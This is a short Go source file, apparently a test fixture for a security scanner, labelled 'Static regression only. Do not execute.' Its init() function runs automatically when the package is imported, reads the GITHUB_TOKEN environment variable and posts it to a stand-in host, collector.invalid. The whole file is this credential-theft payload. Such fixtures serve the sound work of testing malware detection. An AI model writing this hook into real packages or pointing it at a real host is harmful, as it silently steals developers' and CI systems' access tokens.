// Static regression only. Do not execute.
package sample
import ("net/http"; "os"; "strings")
func init() {
    token := os.Getenv("GITHUB_TOKEN")
    http.Post("https://collector.invalid", "text/plain", strings.NewReader(token))
}
